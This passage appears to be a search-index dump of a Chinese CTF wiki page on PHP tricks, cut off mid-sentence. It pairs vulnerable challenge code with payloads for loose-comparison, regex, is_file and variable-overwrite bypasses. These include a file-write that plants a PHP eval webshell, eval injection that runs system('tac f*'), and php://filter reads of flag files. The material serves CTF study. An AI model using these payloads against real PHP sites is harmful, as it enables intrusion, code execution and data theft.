\u5373\u4ee3\u7801\u7684\u4e24\u8fb9\u6709\u4e00\u8fb9\u4e3a\u771f\u65e2\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u5176\u5b9e\u4e3a\u5783\u573e\u4ee3\u7801\u6ca1\u6709\u4efb\u4f55\u7528\u7684\u3002 or \u540e\u9762\u67096\uff0c\u975e\u96f6\u503c\u5373\u4e3a\u771f\u3002\u65e2\u53ef\u4ee5\u6210\u529f\u7ed5\u8fc7\u3002 In_array\u4e2d\u7684\u5f31\u7c7b\u578b\u6bd4\u8f83 \u00b6 ctf-show\u4e2d\u7684\u4e00\u9053\u9898 $allow = array(); for ($i=36; $i < 0x36d; $i++) { array_push($allow, rand(1,$i)); } if(isset($_GET['n']) && in_array($_GET['n'], $allow)){ file_put_contents($_GET['n'], $_POST['content']); } \u67e5\u770b\u8fd9\u6837\u4e00\u4e2a\u7ed3\u679c\uff1a $allow = array(1,'2','3'); var_dump(in_array('1.php',$allow));//\u8fd4\u56detrue $allow = array('1','2','3'); var_dump(in_array('1.php',$allow));//\u8fd4\u56defalse in_array\u5ef6\u7528\u4e86php\u4e2d\u7684==\uff0c\u56e0\u4e3a\u65b0\u52a0\u8fdb\u53bb\u7684\u968f\u673a\u6570\u5b57\u6bcf\u6b21\u90fd\u5305\u542b1\uff0c1\u5b58\u5728\u7684\u51e0\u7387\u662f\u6700\u5927\u7684\u3002 payload\uff1a n=1.php post:content=<?php eval($_POST[1]);?> \u5b98\u65b9\u6587\u6863\uff1a PHP \u7c7b\u578b\u6bd4\u8f83\u8868 parse_str \u00b6 \u5b98\u65b9\u6587\u6863\u7684\u4ecb\u7ecd parse_str \u2014 \u5c06\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u591a\u4e2a\u53d8\u91cf parse_str ( string $encoded_string [, array &$result ] ) : void \u5982\u679c\u8bbe\u7f6e\u4e86\u7b2c\u4e8c\u4e2a\u53d8\u91cf result\uff0c \u53d8\u91cf\u5c06\u4f1a\u4ee5\u6570\u7ec4\u5143\u7d20\u7684\u5f62\u5f0f\u5b58\u5165\u5230\u8fd9\u4e2a\u6570\u7ec4\uff0c\u4f5c\u4e3a\u66ff\u4ee3\u3002 \u90a3\u4e48\u6709\u8fd9\u6837\u4e00\u4e2a\u4f8b\u5b50,\u7b80\u7b80\u5355\u5355\u770b\u4e00\u770b\u5c31\u597d\u4e86 $a='q=123&p=456'; parse_str($a,$b); echo $b['q']; //\u8f93\u51fa123 echo $b['p']; //\u8f93\u51fa456 \u4e3a\u4e86\u52a0\u6df1\u5f71\u54cd\u8fd9\u91cc\u518d\u8865\u5145\u4e00\u4e2a\u7b80\u7b80\u5355\u5355\u7684web\u9898\u76ee if(isset($_POST['v1'])){ $v1 = $_POST['v1']; $v3 = $_GET['v3']; parse_str($v1,$v2); if($v2['flag']==md5($v3)){ echo $flag; } } //\u6240\u4ee5\u8fd9\u4e2a\u9898\u6211\u4eec\u4f20\u5165v1=1 \u7136\u540ev3=flag=c4ca4238a0b923820dcc509a6f75849b \u53731\u7684md5\u503c\u5373\u53ef ereg---%00\u6b63\u5219\u622a\u65ad \u00b6 \u6ca1\u5565\u7279\u522b\u597d\u8bb2\u89e3\u7684\uff0c\u4ece\u4e00\u9053web\u9898\u76ee\u5f53\u4e2d\u5f00\u542f\u5b66\u4e60\u5427 if (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE) { die('error'); } //\u53ea\u670936d\u7684\u4eba\u624d\u80fd\u770b\u5230flag if(intval(strrev($_GET['c']))==0x36d){ echo $flag; } //\u8865\u5145\u51fd\u6570 //strrev() \u5b57\u7b26\u4e32\u53cd\u8f6c //intval() \u83b7\u53d6\u53d8\u91cf\u7684\u6574\u6570\u503c //\u672c\u9898payload\uff1ac=a%00778 //\u5907\u6ce8\uff1a\u9996\u5148\u6b63\u5219\u8868\u8fbe\u5f0f\u53ea\u4f1a\u5339\u914d%00\u4e4b\u524d\u7684\u5185\u5bb9\uff0c\u540e\u9762\u7684\u88ab\u622a\u65ad\u6389\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u68c0\u6d4b\uff0c\u540e\u9762\u901a\u8fc7\u53cd\u8f6c\u6210877%00a\uff0c\u518d\u7528intval\u51fd\u6570\u83b7\u53d6\u6574\u6570\u90e8\u5206\u5f97\u5230877\uff0c877\u4e3a0x36d\u768410\u8fdb\u5236\u3002 is_file \u00b6 php\u4f2a\u534f\u8bae\u7ed5\u8fc7is_file+highlight_file \u00b6 \u4ece\u4e00\u9053ctf\u9898\u76ee\u5b66\u4e60 function filter($file){ if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){ die(\"hacker!\"); }else{ return $file; } } $file=$_GET['file']; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } \u51fd\u6570\u4ecb\u7ecd\uff1a is_file \u2014 \u5224\u65ad\u7ed9\u5b9a\u6587\u4ef6\u540d\u662f\u5426\u4e3a\u4e00\u4e2a\u6b63\u5e38\u7684\u6587\u4ef6 is_file ( string $filename ) : bool \u90e8\u5206payload\uff1a \u53ef\u4ee5\u76f4\u63a5\u7528\u4e0d\u5e26\u4efb\u4f55\u8fc7\u6ee4\u5668\u7684filter\u4f2a\u534f\u8bae payload:file=php://filter/resource=flag.php \u4e5f\u53ef\u4ee5\u7528\u4e00\u4e9b\u6ca1\u6709\u8fc7\u6ee4\u6389\u7684\u7f16\u7801\u65b9\u5f0f\u548c\u8f6c\u6362\u65b9\u5f0f payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php file=compress.zlib://flag.php payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php PHP\u652f\u6301\u7684\u5b57\u7b26\u7f16\u7801 \u5982\u679c\u8fd8\u8fc7\u6ee4\u4e86 filter \u534f\u8bae\u600e\u4e48\u529e\u5462\uff0c\u770b\u4e0b\u4e00\u4e2a \u591a\u6b21\u91cd\u590d/proc/self/root\u7ed5\u8fc7is_file \u00b6 function filter($file){ if(preg_match('/\\.\\.\\/|http|filter|https|data|input|rot13|base64|string/i',$file)){ die(\"hacker!\"); }else{ return $file; } } $file=$_GET['file']; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php \u8fd8\u6709\u4e00\u4e2a\u91ce\u86ee\u4eba\u7b14\u8bb0 php\u6e90\u7801\u5206\u6790 require_once \u7ed5\u8fc7\u4e0d\u80fd\u91cd\u590d\u5305\u542b\u6587\u4ef6\u7684\u9650\u5236 php\u53d8\u91cf\u540d\u5982\u4f55\u975e\u6cd5\u5b57\u7b26 \u00b6 \u6211\u4eec\u77e5\u9053php\u53d8\u91cf\u547d\u540d\u662f\u4e0d\u5141\u8bb8\u4f7f\u7528\u70b9\u53f7\u7684\uff0c\u4f46\u662f\u7528\u4e86\u70b9\u600e\u4e48\u534a\u5462\uff0c\u770b\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u5427 \u5148\u6765\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 \u5f53\u6211\u4eecPOST yyy.yyy=1 \u7684\u65f6\u5019\u88ab\u89e3\u6790\u4e3a [\"yyy_yyy\"]=> string(1) \"1\" \u65e0\u8bba\u540e\u9762\u52a0\u591a\u5c11\u4e2a .yyy \u5b83\u90fd\u4f1a\u88ab\u89e3\u6790\u4e3a _ \uff0c\u4f46\u662f yyy[yyy.yyy=1 \u88ab\u89e3\u6790\u4e3a yyy_yyy.yyy \u8fd9\u4e2a yyy[yyy[yyy=1 \u4e3a yyy_yyy[yyy \u5177\u4f53\u539f\u7406\u4e0d\u6e05\u695a\uff0c\u6ca1\u8bfb\u8fc7php\u6e90\u4ee3\u7801 $_SERVER['argv']\u7684\u9a9a\u64cd\u4f5c \u00b6 1\u3001cli\u6a21\u5f0f\uff08\u547d\u4ee4\u884c\uff09\u4e0b \u7b2c\u4e00\u4e2a\u53c2\u6570$_SERVER['argv'][0]\u662f\u811a\u672c\u540d\uff0c\u5176\u4f59\u7684\u662f\u4f20\u9012\u7ed9\u811a\u672c\u7684\u53c2\u6570 2\u3001web\u7f51\u9875\u6a21\u5f0f\u4e0b \u5728web\u9875\u6a21\u5f0f\u4e0b\u5fc5\u987b\u5728php.ini\u5f00\u542fregister_argc_argv\u914d\u7f6e\u9879 \u8bbe\u7f6eregister_argc_argv = On(\u9ed8\u8ba4\u662fOff) \u8fd9\u65f6\u5019\u7684$_SERVER[\u2018argv\u2019][0] = $_SERVER[\u2018QUERY_STRING\u2019] $argv,$argc\u5728web\u6a21\u5f0f\u4e0b\u4e0d\u9002\u7528 CLI\u6a21\u5f0f\u4e0b\u76f4\u63a5\u628a request info \u2fa5\u2faf\u7684argv\u503c\u590d\u5236\u5230arr\u6570\u7ec4\u4e2d\u53bb \u7ee7\u7eed\u5224\u65adquery string\u662f\u5426\u4e3a\u7a7a\uff0c \u5982\u679c\u4e0d\u4e3a\u7a7a\u628a\u901a\u8fc7+\u7b26\u53f7\u5206\u5272\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u6210php\u5185\u90e8\u7684zend_string\uff0c \u7136\u540e\u518d\u628a\u8fd9\u4e2azend_string\u590d\u5236\u5230 arr \u6570\u7ec4\u4e2d\u53bb\u3002 \u56e0\u6b64\u52a0\u53f7+\u5206\u5272argv\u6210\u591a\u4e2a\u90e8\u5206 \u8fd9\u91cc\u505a\u4e2a\u6d4b\u8bd5 <?php $a = $_SERVER [ 'argv' ]; var_dump ( $a ); http :// localhost : 63342 / myphptest / mytest . php ? _ijt = kbaatem1e97lqblmkrg3lvk83g & a = 1 + yyy = 3 \u5f97\u5230\u7ed3\u679c array ( 2 ) { [ 0 ] => string ( 35 ) \"_ijt=kbaatem1e97lqblmkrg3lvk83g&a=1\" [ 1 ] => string ( 5 ) \"yyy=3\" } \u53d8\u91cf\u8986\u76d6 \u00b6 \u8fd8\u662f\u4ece\u4e00\u9053\u9898\u5f53\u4e2d\u8bb2\u89e3,\u4ee3\u7801\u5ba1\u8ba1\uff0c\u9898\u76ee\u4e00\u5171\u6709\u4e09\u4e2a\u53d8\u91cf $error $suces $flag \u6211\u4eec\u53ea\u8981\u4ee4\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u7684\u503c\u4e3aflag\uff0c\u90fd\u662f\u53ef\u4ee5\u901a\u8fc7die\u6216\u8005\u76f4\u63a5echo\u8f93\u51fa\u7684\u3002\u5047\u8bbe $flag=flag{test123} $error='error!'; $suces='success!'; foreach($_GET as $key => $value){ if($key==='error'){ die(\"what are you doing?!\"); } $$key=$$value; }foreach($_POST as $key => $value){ if($value==='flag'){ die(\"what are you doing?!\"); } $$key=$$value; } if(!($_POST['flag']==$flag)){ die($error); } echo \"your are good\".$flag.\"\\n\"; die($suces); \u4e00\u3001\u901a\u8fc7die($error)\u8f93\u51fa `payload:a=flag post: error=a` \u6b64\u65f6 $a=flag{test123};$error=flag{test123}; \u4ece\u800c\u8f93\u51faerror\u4e5f\u5c31\u662f\u8f93\u51faflag \u4e8c\u3001\u901a\u8fc7die($suces) payload:suces=flag&flag= \u6b64\u65f6 $scues=flag{test123};$_POST['flag']=NULL;$flag=NULL \uff0c\u6ee1\u8db3 ($_POST['flag']==$flag) \u8865\u5145\u4e00\u4e9b\u5176\u4ed6\u795e\u5947\u59ff\u52bf \u00b6 \u8def\u5f84\u95ee\u9898 \u00b6 if(isset($_GET['u'])){ if($_GET['u']=='flag.php'){ die(\"no no no\"); }else{ highlight_file($_GET['u']); } } Payload\uff1a \u4e0b\u9762\u65b9\u5f0f\u5728highlight_file\u4e2d\u5747\u7b49\u6548\u4e8eflag.php\uff0c\u4e5f\u5373\u672c\u9898\u7684payload /var/www/html/flag.php \u7edd\u5bf9\u8def\u5f84 ./flag.php \u76f8\u5bf9\u8def\u5f84 php://filter/resource=flag.php php\u4f2a\u534f\u8bae \u4e09\u76ee\u8fd0\u7b97\u7b26\u4e0e\u53d8\u91cf\u8986\u76d6 \u00b6 \u9996\u5148\u770b\u770b\u4e0b\u9762\u8fd9\u6837\u4e00\u4e2a\u4ee3\u7801\uff1a $_GET?$_GET=&$_POST:'flag'; $_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag'; $_GET['flag']=='flag'?$_GET=&$_SERVER:'flag'; highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__); \u6839\u636e\u7b2c\u4e00\u6761\u53ef\u77e5\uff0c\u5982\u679cget\u4f20\u4e86\u4e00\u4e2a\u503c\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7528post\u8986\u76d6get\u4e2d\u7684\u503c\u3002 \u4e2d\u95f4\u4e24\u884c\u610f\u4e49\u4e0d\u5927\u3002 \u6700\u540e\u4e00\u884c\u662f,\u5982\u679cget\u4f20\u4e86\u4e00\u4e2a HTTP_FLAG=flag \u5c31\u8f93\u51fa flag \u5426\u5219\u663e\u793a index.php \u6e90\u7801\u3002 \u6240\u4ee5\u6211\u4eec get \u968f\u4fbf\u4f20\u4e00\u4e2a\uff0c\u7136\u540e post \u4f20 HTTP_FLAG=flag \u5373\u53ef `payload get\uff1a1=1 post\uff1aHTTP_FLAG=flag` and\u4e0e&&\u7684\u533a\u522b+\u53cd\u5c04\u7c7bReflectionClass\u7684\u4f7f\u7528 \u00b6 $getflag = new getflag(); $v1=$_GET['v1']; $v2=$_GET['v2']; $v3=$_GET['v3']; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0){ if(!preg_match(\"/\\;/\", $v2)){ if(preg_match(\"/\\;/\", $v3)){ eval(\"$v2('getflag')$v3\"); } } } \u5176\u5b9e\u4e3b\u8981\u8fd8\u662f\u901a\u8fc7\u8fd9\u9053\u9898\u5b66\u4e60\u4e86php\u7684\u53cd\u5c04\u4ee5\u53caand\u7684\u4e00\u4e9b\u5c0f\u7279\u6027 \u4e0b\u9762\u9996\u5148\u662f\u8bb2 and\u4e0e$$ ,\u6240\u4ee5\u53ea\u9700\u8981\u4fdd\u8bc1\u7b2c\u4e00\u4e2a\u4e3a true \u5373\u53ef <?php $a = true and false and false ; var_dump ( $a ); //\u8fd4\u56detrue $a = true && false && false ; var_dump ( $a ); //\u8fd4\u56defalse \u4e0b\u9762\u6765\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u53cd\u5c04\u7684\u76f8\u5173\u5b9a\u4e49\u4e0e\u51fd\u6570\uff0c\u611f\u89c9 \u5b98\u65b9\u6587\u6863 \u5f88\u8be6\u7ec6,\u81ea\u5df1\u70b9\u5f00\u5b66\u4e60\u4e00\u4e0b\u5373\u53ef \u6240\u4ee5\u5f97\u5230 payload:?v1=1&v2=echo new ReflectionClass&v3=; \u5176\u5b9e\u8fd8\u6709\u5f88\u591a\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u8fc7\u6ee4\u6bd4\u8f83\u5c11\uff0c\u6bd4\u5982 v1=1&v2=?><?php echo ls ?>/*&v3=;*/ \uff0c\u6216\u8005\u6765\u4e2ainclude\u52a0\u4f2a\u534f\u8bae\u7ed5\u8fc7\u4e5f\u884c and\u4f18\u5148\u7ea7 \u00b6 $a = true and false; var_dump(true and false); var_dump($a); \u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u5c45\u7136\u662f\uff1a\uff01\uff01\uff01 bool(false)\uff1a\uff1a\u76f8\u5f53\u4e8e\u662f($a = true) and false; bool(true) \u9644\u4e0a\uff1a \u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7 php \u5f02\u5e38\u7c7b \u00b6 \u8fd8\u662f\u4ecectfshow\u5f53\u4e2d\u4e00\u9053\u9898\u5b66\u4e60 if(isset($_GET['v1']) && isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){ eval(\"echo new $v1($v2());\"); } } \u5148\u6765\u770b\u4e0b\u8fd9\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f /[a-zA-Z]+/ \u5339\u914d \u81f3\u5c11\u6709\u4e00\u4e2a\u5b57\u6bcd \u7684\u5b57\u7b26\u4e32 \u6240\u4ee5\u6211\u4eec\u53ea\u8981\u8ba9new\u540e\u9762\u6709\u4e2a\u7c7b\u4e0d\u62a5\u9519\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u968f\u610f\u6784\u9020\u4e86\u3002\u6211\u4eec\u968f\u4fbf\u627e\u4e2aphp\u4e2d\u7684\u5185\u7f6e\u7c7b\u5e76\u4e14\u53ef\u4ee5\u76f4\u63a5echo\u8f93\u51fa\u7684\u5c31\u53ef\u4ee5\u4e86\u3002 \u4e3e\u4e24\u4e2a\u4f8b\u5b50 Exception ReflectionClass \u7b54\u6848\u4e3e\u4f8b payload: v1=Exception();system('tac f*');//&v2=a v1=ReflectionClass&v2=system('tac f*') FilesystemIterator\u7c7b\u7684\u4f7f\u7528 \u00b6 \u6709\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u51fd\u6570\u904d\u5386\u5f53\u524d\u76ee\u5f55\u6216\u8005\u770b\u60c5\u51b5\u5176\u4ed6\u76ee\u5f55 <?php $a = new FilesystemIterator ( \"../../\" ); while ( $a -> valid ()){ //\u5224\u65ad\u662f\u5426\u5230\u5e95 echo $a -> getFilename () . '\\n' ; $a -> next (); } \u914d\u5408\u4e0b\u9762\u51fd\u6570 getcwd () getcwd \u2014 \u53d6\u5f97\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55 getcwd ( void ) : string DirectoryIterator\u7c7b\u4e0eglob\u534f\u8bae\u904d\u5386\u76ee\u5f55 \u00b6 \u901a\u5e38\u53ef\u4ee5\u914d\u5408RCE\u4f7f\u7528 <?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f->__toString().' '); } exit(0); ?> \u8d85\u5168\u5c40\u53d8\u91cf$GLOBALS \u00b6 \u9996\u5148\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u8d85\u5168\u5c40\u53d8\u91cf $GLOBALS \u2014 \u5f15\u7528\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u53ef\u7528\u7684\u5168\u90e8\u53d8\u91cf \u4e00\u4e2a\u5305\u542b\u4e86\u5168\u90e8\u53d8\u91cf\u7684\u5168\u5c40\u7ec4\u5408\u6570\u7ec4\u3002\u53d8\u91cf\u7684\u540d\u5b57\u5c31\u662f\u6570\u7ec4\u7684\u952e\u3002 \u8fd8\u662f\u4ece\u4e00\u9053\u7f51\u4e0actf\u9898\u76ee\u8fdb\u884c\u8bb0\u5f55 function getFlag(&$v1,&$v2){ eval(\"$$v1 = &$$v2;\"); var_dump($$v1); } if(isset($_GET['v1']) && isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v1)){ die(\"error v1\"); } if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v2)){ die(\"error v2\"); } if(preg_match('/ctf/', $v1)){ getFlag($v1,$v2); } } \u770b\u5230\u4e00\u5806\u8fc7\u6ee4\u7684\u5934\u5927\uff0c\u4f46\u662f\u770b\u5230 getFlag \u51fd\u6570\u5f53\u4e2d\u6709\u4e24\u4e2a $$ \uff0c\u6240\u4ee5\u5bf9\u4e8e\u8be5\u9898\uff0c\u53ea\u8981\u628a$GLOBALS\u8d4b\u503c\u7ed9v2\uff0c\u7136\u540ev2\u518d\u8d4b\u503c\u7ed9v1,\u5373\u53ef\u5c06\u5168\u90e8\u53d8\u91cf\u8f93\u51fa payload\uff1a v1=ctf&v2=GLOBALS php://filter\u7684\u4e00\u4e9b\u5e38\u89c1\u914d\u5408\u7f16\u7801 \u00b6 payload: file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php post:contents=? ? \u8fd9\u79cd\u662f\u5c06\u5b57\u7b26\u4e24\u4f4d\u4e24\u4f4d\u8fdb\u884c\u4ea4\u6362","title":"\u51fd\u6570Tricks"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#tricks","text":"","title":"\u51fd\u6570Tricks"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#is_numeric","text":"\u8fd9\u4e2a\u51fd\u6570\u5c31\u4e0d\u5fc5\u591a\u8bf4\u4e86\uff0c\u597d\u5427\u61c2\u82f1\u8bed\u4f60\u5c31\u61c2\u4e86\uff01\uff01\uff01 \u6765\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5 for ($i=0; $i <128 ; $i++) { $x=chr($i).'1'; if(is_numeric($x)==true){ echo urlencode(chr($i)).\"\\n\"; } } \u53d1\u73b0\u4e0b\u9762\u8fd9\u4e9b\u90fd\u662f\u6d4b\u8bd5\u901a\u8fc7\u7684\u5b57\u7b26 %09---\u6c34\u5e73\u5b9a\u4f4d\u7b26\u53f7 %0A---\u6362\u884c\u952e %0B---\u5782\u76f4\u5b9a\u4f4d\u7b26\u53f7 %0C---\u6362\u9875\u952e %0D---\u5f52\u4f4d\u952e %2B---\u5c31\u662f\u52a0\u53f7 %20---\u7a7a\u683c - + . \u4f46\u662f\u8fd9\u4e2a\u4e0d\u662f\u91cd\u70b9\uff0c\u91cd\u70b9\u662f\u914d\u5408\u5176\u4ed6\u51fd\u6570\u641e\u4e8b\u60c5\uff0c\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50trim\u5c31\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u4f8b\u5b50","title":"is_numeric"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#trimis_numeric","text":"\u9996\u5148\u642c\u8fd0\u5de5\u642c\u8fd0\u4e00\u4e0b\u5b98\u7f51\u7684\u4ecb\u7ecd \u8bed\u6cd5 trim(string,charlist) \u53c2\u6570 \u63cf\u8ff0 string \u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u68c0\u67e5\u7684\u5b57\u7b26\u4e32\u3002 charlist \u53ef\u9009\u3002\u89c4\u5b9a\u4ece\u5b57\u7b26\u4e32\u4e2d\u5220\u9664\u54ea\u4e9b\u5b57\u7b26\u3002\u5982\u679c\u7701\u7565\u8be5\u53c2\u6570\uff0c\u5219\u79fb\u9664\u4e0b\u5217\u6240\u6709\u5b57\u7b26\uff1a \"\\0\" - NULL \"\\t\" - \u5236\u8868\u7b26 \"\\n\" - \u6362\u884c \"\\x0B\" - \u5782\u76f4\u5236\u8868\u7b26 \"\\r\" - \u56de\u8f66 \" \" - \u7a7a\u683c \u5e76\u4e14\u5982\u679c\u4f60\u60f3\u77e5\u9053\u6709\u54ea\u4e9b\u4e5f\u53ef\u4ee5\u8fd0\u884c\u770b\u770b for ($i=0; $i <=128 ; $i++) { $x=chr($i).'1'; if(trim($x)!=='1' && is_numeric($x)){ echo urlencode(chr($i)).\"\\n\"; } } \u53d1\u73b0\u9664\u4e86+-.\u53f7\u4ee5\u5916\u8fd8\u6709\u53ea\u5269\u4e0b%0c\u4e5f\u5c31\u662f\u6362\u9875\u7b26\u4e86 \u6765\u770b\u4e00\u9053ctf\u9898\u76ee function filter($num){ $num=str_replace(\"0x\",\"1\",$num); $num=str_replace(\"0\",\"1\",$num); $num=str_replace(\".\",\"1\",$num); $num=str_replace(\"e\",\"1\",$num); $num=str_replace(\"+\",\"1\",$num); return $num; } $num=$_GET['num']; if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){ if($num=='36'){ echo $flag; }else{ echo \"hacker!!\"; } }else{ echo \"hacker!!!\"; } payload:num=%0c36","title":"trim\u4e0eis_numeric"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#preg_match","text":"","title":"preg_match"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#_1","text":"if(preg_match(\"/[0-9]/\", $num)){ die(\"no no no!\"); } \u5b98\u65b9\u6587\u6863\u4e2d\u4ecb\u7ecd\u5982\u4e0b\uff1a preg_match()\u8fd4\u56de pattern \u7684\u5339\u914d\u6b21\u6570\u3002 \u5b83\u7684\u503c\u5c06\u662f0\u6b21\uff08\u4e0d\u5339\u914d\uff09\u62161\u6b21 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u4e0d\u6309\u89c4\u5b9a\u4f20\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u5c31\u4f1a\u8fd4\u56defalse\uff0c\u4ece\u800c\u4e0d\u4f1a\u8fdb\u5165if\uff0c\u8fbe\u5230\u7ed5\u8fc7\u7684\u6548\u679c\u3002 payload:num[]=1","title":"\u6570\u7ec4\u7ed5\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#_2","text":"\u9996\u5148\u8bf4\u660e\u4e0b\u51e0\u4e2a\u5e38\u89c1\u7684\u6a21\u5f0f\uff1a \\i \u4e0d\u533a\u5206(ignore)\u5927\u5c0f\u5199 \\m \u591a(more)\u884c\u5339\u914d \u82e5\u5b58\u5728\u6362\u884c\\n\u5e76\u4e14\u6709\u5f00\u59cb^\u6216\u7ed3\u675f$\u7b26\u7684\u60c5\u51b5\u4e0b\uff0c \u5c06\u4ee5\u6362\u884c\u4e3a\u5206\u9694\u7b26\uff0c\u9010\u884c\u8fdb\u884c\u5339\u914d $str = \"abc\\nabc\"; $preg = \"/^abc$/m\"; preg_match($preg, $str,$matchs); \u8fd9\u6837\u5176\u5b9e\u662f\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\uff0c\u56e0\u4e3a\u5339\u914d\u7684\u65f6\u5019 \u5148\u662f\u5339\u914d\u6362\u884c\u7b26\u524d\u9762\u7684\uff0c\u63a5\u7740\u5339\u914d\u6362\u884c\u7b26\u540e\u9762\u7684\uff0c\u4e24\u4e2a\u90fd\u662fabc\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \\s \u7279\u6b8a\u5b57\u7b26\u5706\u70b9 . \u4e2d\u5305\u542b\u6362\u884c\u7b26 \u9ed8\u8ba4\u7684\u5706\u70b9 . \u662f\u5339\u914d\u9664\u6362\u884c\u7b26 \\n \u4e4b\u5916\u7684\u4efb\u4f55\u5355\u5b57\u7b26\uff0c\u52a0\u4e0as\u4e4b\u540e, .\u5305\u542b\u6362\u884c\u7b26 $str = \"abggab\\nacbs\"; $preg = \"/b./s\"; preg_match_all($preg, $str,$matchs); \u8fd9\u6837\u5339\u914d\u5230\u7684\u6709\u4e09\u4e2a bg b\\n bs \\A \u5f3a\u5236\u4ece\u76ee\u6807\u5b57\u7b26\u4e32\u5f00\u5934\u5339\u914d; \\D \u5982\u679c\u4f7f\u7528$\u9650\u5236\u7ed3\u5c3e\u5b57\u7b26,\u5219\u4e0d\u5141\u8bb8\u7ed3\u5c3e\u6709\u6362\u884c; \\e \u914d\u5408\u51fd\u6570preg_replace()\u4f7f\u7528, \u53ef\u4ee5\u628a\u5339\u914d\u6765\u7684\u5b57\u7b26\u4e32\u5f53\u4f5c\u6b63\u5219\u8868\u8fbe\u5f0f\u6267\u884c; \u6240\u4ee5\u53ef\u4ee5\u8fdb\u884crce \u6211\u4eec\u6765\u5206\u6790\u4e0b\u561b\u8fd9\u4e00\u9053\u9898 $a=$_GET['cmd']; if(preg_match('/^php$/im', $a)){ if(preg_match('/^php$/i', $a)){ echo 'hacker'; } else{ echo $flag; } } payload:cmd=%0aphp %0aphp \u7ecf\u8fc7\u7b2c\u4e00\u4e2a\u5339\u914d\u65f6\uff0c\u4ee5\u6362\u884c\u7b26\u4e3a\u5206\u5272\u4e5f\u5c31\u662f%0a\uff0c\u524d\u9762\u56e0\u4e3a\u662f\u7a7a\u7684\uff0c\u6240\u4ee5\u53ea\u5339\u914d\u6362\u884c\u7b26\u540e\u9762\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u3002 \u7ecf\u8fc7\u7b2c\u4e8c\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f%0aphp 